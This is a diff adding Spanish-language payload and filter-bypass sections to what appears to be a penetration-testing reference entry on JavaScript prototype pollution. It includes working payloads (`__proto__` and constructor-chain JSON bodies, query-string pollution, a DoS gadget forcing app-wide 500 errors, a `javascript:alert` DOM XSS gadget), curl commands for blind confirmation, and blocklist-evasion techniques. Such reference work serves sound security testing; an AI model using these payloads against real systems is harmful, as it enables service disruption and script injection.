@@ -95,6 +95,50 @@ chains_with: [mass-assignment, api-abuse, business-logic]
 - Known server-side prototype pollution scanners (e.g. community `ppmap`/`server-side-prototype-pollution` tooling) for sweeping multiple endpoints after manual confirmation.
 - Dependency version fingerprinting (`package-lock.json` if leaked, `X-Powered-By`, bundled source maps) to match against known-CVE library versions.
 
+## Payloads & Detection Patterns
+
+Una familia por sink de polución. Server-side es casi siempre blind: la prueba es el **par de
+requests** (un request posterior, separado y no relacionado, cambia de comportamiento solo tras la
+polución). Polución sin gadget = `Inferred`/baja; el gadget concreto la lleva a `Demonstrated`.
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| `__proto__` key (JSON body) | `{"__proto__":{"polluted":"yes"}}` | Polución server-side vía merge/extend |
+| Constructor chain | `{"constructor":{"prototype":{"polluted":"yes"}}}` | Evadir filtros ingenuos de la key `__proto__` |
+| URL/query param | `?__proto__[polluted]=1`, `?__proto__.polluted=1`, `#__proto__[polluted]=1` | Polución client-side vía parser de opciones |
+| DoS gadget (type break) | `{"__proto__":{"status":500}}`, `{"__proto__":{"toJSON":"x"}}` | 500 app-wide en un request posterior (señal fuerte, blind) |
+| DOM XSS gadget | `?__proto__[transform_url]=javascript:alert(document.domain)` | Gadget client-side que llega a un sink (target-specific) |
+| RCE gadget | Prop polucionada que alimenta template engine/`child_process` (library-specific) | Solo con visibilidad de versión; destructivo → gate operador |
+
+Surface signals que delatan la clase antes de inyectar:
+- Bundle JS importa `lodash.merge/defaultsDeep/set`, `$.extend(true,...)`, o un merge recursivo a mano.
+- Query/fragment parseados en un objeto de opciones mergeado con defaults de la app.
+- Backend Node (`X-Powered-By: Express`, stack traces Node) que acepta JSON anidado mergeado en
+  config/session/user compartido entre requests.
+- Versiones con CVE histórico: `lodash`<4.17.21, `jquery`<3.4.0, `minimist`<1.2.6, `qs`, `hoek`, `deep-extend`.
+
+```bash
+# server-side blind: el par antes/después en un request SEPARADO es la prueba
+curl -s -o /dev/null -w "pre %{http_code}\n" https://target/api/health
+curl -s -X POST https://target/api/profile -H "Content-Type: application/json" \
+  -d '{"__proto__":{"status":500}}'
+curl -s -o /dev/null -w "post %{http_code}\n" https://target/api/health   # 500 solo después = PP
+```
+Client-side: recargar en un browser real y confirmar `Object.prototype.polluted` en consola.
+
+## Bypass Techniques
+
+Agrupadas por el filtro de pollution evadido; verificar versión y tipo del merge target antes de
+cerrar como N/A.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Blocklist de la key `__proto__` | Cadena `constructor.prototype` | Llega al mismo prototype sin la key literal |
+| Filtro flat (solo top-level) | Anidar `{"a":{"__proto__":{...}}}` según el merge recursivo | El merge profundo procesa los niveles internos |
+| `JSON.parse` sanea `__proto__` | Bracket/dot en query string (`__proto__[x]`, `__proto__.x`) | El parser de querystring (`qs`) lo expande a objeto |
+| Merge target seguro (`Object.create(null)`/`Map`) | Confirmar versión y tipo de target antes de concluir | No asumir "es lodash, está bien" en ningún sentido |
+| Library parcheada | Fingerprint de versión exacta (lock file, source map, `X-Powered-By`) | lodash ≥4.17.21 con fix bloquea; confirmar, no asumir |
+
 ## Root Causes
 
 - Recursive merge/clone/set utility (`lodash.merge`, `jQuery.extend(true, ...)`, hand-rolled deep merge) does not block `__proto__`, `constructor`, and `prototype` as key names before assigning into the target object.
